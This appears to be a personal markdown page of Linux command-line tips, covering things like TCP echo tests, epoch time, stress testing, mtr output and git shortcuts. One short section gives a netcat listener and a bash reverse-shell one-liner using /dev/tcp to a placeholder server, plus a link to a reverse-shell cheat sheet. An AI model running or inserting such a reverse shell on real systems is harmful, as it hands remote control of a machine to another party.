cmak# Linux CLI tricks

# Send a string to an IP/port
```bash
telnet 127.0.0.1 80

(echo hello; sleep 1) | telnet 127.0.0.1 80

echo hello > /dev/tcp/127.0.0.1/80

echo hello | nc localhost 80
```

# Reverse shell
```bash
# server
nc -knvlp 3389

# client
bash -i >& /dev/tcp/server_ip/3389 0>&1
```

## See also

- https://tldp.org/LDP/abs/html/x17974.html
- https://highon.coffee/blog/reverse-shell-cheat-sheet/
- https://catonmat.net/bash-one-liners-explained-part-three
- http://docs.eggplantsoftware.com/epp/9.0.0/ePP/advovercoming_tcpip_connection_li.htm

# Target everything but one file
```
git add !(unit.md)
```

# Print a random line from a file
```bash
sed "$(( $RANDOM % $(cat readme.txt | wc -l) ))q;d" readme.txt

shuf readme.txt | head -1
```

# Epoch seconds
From bash 5.

```bash
$ echo $EPOCHREALTIME
1614870873.574544

$ echo $EPOCHSECONDS
1614870876
```

# uptime

The three load average values are 1, 5 and 15 minutes.

```bash
$ uptime
15:29:28 up 20:23, 0 users, load average: 5.08, 1.49, 0.51
```

# stress

Stress your system in different ways.

```bash
$ stress --cpu 8
```

# Number of processors
```
$ make -j $(nproc)
```

# Synonyms for localhost

```bash
localhost
127.0.0.1
127.0.0.2
127.0.0.3
127.1
0.0.0.0
0 # wut
```

# Move a file out of the way

```bash
mv {,_}.bash_history
```

# Verbose time

```
$ /usr/bin/time -v ls /
bin dev home lib lib64 lost+found mnt proc run snap sys usr
boot etc init lib32 libx32 media opt root sbin srv tmp var
Command being timed: "ls /"
User time (seconds): 0.00
System time (seconds): 0.00
Percent of CPU this job got: 100%
Elapsed (wall clock) time (h:mm:ss or m:ss): 0:00.00
Average shared text size (kbytes): 0
Average unshared data size (kbytes): 0
Average stack size (kbytes): 0
Average total size (kbytes): 0
Maximum resident set size (kbytes): 2412
Average resident set size (kbytes): 0
Major (requiring I/O) page faults: 0
Minor (reclaiming a frame) page faults: 126
Voluntary context switches: 1
Involuntary context switches: 0
Swaps: 0
File system inputs: 0
File system outputs: 0
Socket messages sent: 0
Socket messages received: 0
Signals delivered: 0
Page size (bytes): 4096
Exit status: 0
```

# Vendor IDs
View the latest on [ieee.org](http://standards-oui.ieee.org/oui.txt).

To install on Ubuntu:
```bash
sudo apt install --yes arp-scan
get-oui
```

# pushd equivalent
I use this all the time. Rather than `pushd` and `popd` to navigate around the file system:
```bash
# Navigate to new dir
cd ~/deanturpin.gitlab.io/content/post

# Return whence you came
cd -
```

# Last argument
I've used `esc shift -` to get the last argument from the previous command for a long time. But it's a little unweildy and you can do the same with `alt .`.

# MTR: "my traceroute"
Like tracepath/route but cooler.

```bash
My traceroute [v0.93]
BootCamp-0263E (172.25.71.53) 2021-04-10T13:22:42+0100
Keys: Help Display mode Restart statistics Order of fields quit
Packets Pings
Host Loss% Snt Last Avg Best Wrst StDev
1. BootCamp-0263E.7thsensedesign.local 0.0% 37 0.6 0.7 0.2 3.5 0.5
2. 192.168.0.1 97.2% 37 5.6 5.6 5.6 5.6 0.0
3. (waiting for reply)
4. brig-core-2b-xe-810-0.network.virginmedia.net 0.0% 37 11.6 15.1 11.1 32.4 4.6
5. (waiting for reply)
6. eislou2-ic-3-ae0-0.network.virginmedia.net 0.0% 37 22.1 26.5 20.0 51.8 7.5
7. 72.14.221.42 0.0% 37 22.7 25.1 20.4 46.0 5.4
8. 108.170.246.161 0.0% 37 19.2 23.4 18.7 39.5 5.0
9. 108.170.246.175 63.9% 37 23.3 28.1 22.9 45.5 6.6
10. 216.239.58.179 63.9% 37 22.2 29.2 22.2 62.7 10.7
11. 142.250.210.20 0.0% 37 101.4 104.0 98.5 111.8 3.4
12. 142.250.210.24 66.7% 37 115.7 114.8 110.2 123.0 3.3
13. 209.85.247.212 66.7% 37 115.7 114.9 108.7 131.7 6.5
14. 209.85.241.205 66.7% 37 111.9 116.2 111.2 129.3 5.0
15. (waiting for reply)
16. (waiting for reply)
17. (waiting for reply)
18. (waiting for reply)
19. (waiting for reply)
20. (waiting for reply)
21. (waiting for reply)
22. (waiting for reply)
23. (waiting for reply)
24. 35.185.44.232 0.0% 36 110.9 113.7 108.8 132.4 5.5
```

# See also
- https://github.blog/2015-06-08-how-to-undo-almost-anything-with-git/
